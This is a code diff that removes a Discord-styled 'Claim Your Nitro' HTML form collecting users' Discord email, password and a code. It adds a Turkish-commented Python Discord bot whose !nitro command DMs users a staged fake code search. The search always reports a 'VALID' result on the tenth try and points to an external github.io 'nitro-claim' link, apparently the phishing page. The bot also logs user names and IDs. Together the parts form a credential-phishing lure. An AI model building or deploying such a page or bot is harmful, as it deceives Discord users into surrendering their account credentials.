@@ -1,26 +1,102 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Claim Your Nitro</title>
-    <style>
-        body { background-color: #313338; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background-color: #2b2d31; padding: 30px; border-radius: 8px; width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        h2 { text-align: center; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 4px; background-color: #1e1f22; color: #fff; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background-color: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        button:hover { background-color: #4752c4; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2>Claim Your Nitro!</h2>
-        <form action="process.php" method="POST">
-            <input type="email" name="email" placeholder="Discord Email" required>
-            <input type="password" name="password" placeholder="Discord Password" required>
-            <input type="text" name="code" placeholder="Nitro Code" required>
-            <button type="submit">Claim</button>
-        </form>
-    </div>
-</body>
-</html>
+import discord
+from discord.ext import commands
+import random
+import string
+import asyncio
+import datetime
+
+# Bot ayarları
+intents = discord.Intents.default()
+intents.message_content = True
+
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f"Bot başarıyla aktif oldu: {bot.user.name}")
+
+@bot.command(name="nitro")
+async def nitro_simulasyon(ctx):
+    kullanici_adi = ctx.author.name
+    kullanici_id = ctx.author.id
+    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Terminale yazdır
+    print(f"[!] Terminal Bildirimi: '{kullanici_adi}' (ID: {kullanici_id}) kullanıcısı !nitro komutunu çalıştırdı! [{zaman}]")
+
+    # Log dosyasına komutu başlatan kişiyi kaydet
+    try:
+        with open("log.txt", "a", encoding="utf-8") as dosya:
+            dosya.write(f"\n--- YENİ İŞLEM [{zaman}] ---\nKullanıcı: {kullanici_adi} (ID: {kullanici_id}) komutu çalıştırdı.\n")
+    except Exception as e:
+        print(f"Log yazılırken hata oluştu: {e}")
+
+    # Sunucudaki komut mesajını sil
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    # Kullanıcıya DM kutusunu kontrol etmesi için bilgi ver
+    await ctx.send(f"{ctx.author.mention}, DM kutunu kontrol et, simülasyonu oraya gönderdim! 🚀", delete_after=5)
+
+    try:
+        # Kullanıcının DM kanalını aç
+        dm_kanal = await ctx.author.create_dm()
+        mesaj = await dm_kanal.send("`[*] Özel Nitro Simülasyonu Başlatıldı (10. denemede VALID bulacak)...`")
+    except discord.Forbidden:
+        await ctx.send(f"{ctx.author.mention}, DM'lerin kapalı! Lütfen botlar için DM'lerini aç.", delete_after=10)
+        return
+
+    karakterler = string.ascii_letters + string.digits
+    sayac = 0
+    
+    while True:
+        sayac += 1
+        anlik_zaman = datetime.datetime.now().strftime("%H:%M:%S")
+        
+        # Simülasyon mantığı: Her 10. denemede VALID bulup dursun
+        if sayac == 10:
+            durum = "VALID 🟢"
+            link = f"https://denizcozeli710-glitch.github.io/nitro-claim/"
+            
+            # Log dosyasına VALID olan sonucu kaydet
+            try:
+                with open("log.txt", "a", encoding="utf-8") as dosya:
+                    dosya.write(f"[{anlik_zaman}] Deneme {sayac} -> {durum} | Link: {link}\n")
+            except:
+                pass
+
+            try:
+                await mesaj.edit(content=f"({durum}) (`{link}`)")
+            except:
+                pass
+            
+            await dm_kanal.send(f"🎉 **MUCİZE!** Geçerli kod bulundu ve otomatik durduruldu, aşkım!\nToplam deneme: **{sayac}**\nKazanan Link: {link}")
+            break
+        else:
+            durum = "UNVALID 🔴"
+            kod = "".join(random.choice(karakterler) for _ in range(16))
+            link = f"https://discord.gift/{kod}"
+            
+            # Log dosyasına üretilen unvalid linkleri kaydet
+            try:
+                with open("log.txt", "a", encoding="utf-8") as dosya:
+                    dosya.write(f"[{anlik_zaman}] Deneme {sayac} -> {durum} | Link: {link}\n")
+            except:
+                pass
+            
+        try:
+            await mesaj.edit(content=f"({durum}) (`{link}`)")
+        except discord.HTTPException:
+            await asyncio.sleep(1.5)
+            continue
+            
+        await asyncio.sleep(0.8)
+
+# Botu çalıştırırken hata yakalama bloğu
+try:
+    bot.run("BURAYA_TOKEN_GELECEK")
+except Exception as e:
+    print(f"BİR HATA OLUŞTU: {e}")
+    input("Çıkış yapmak için Enter'a bas...")
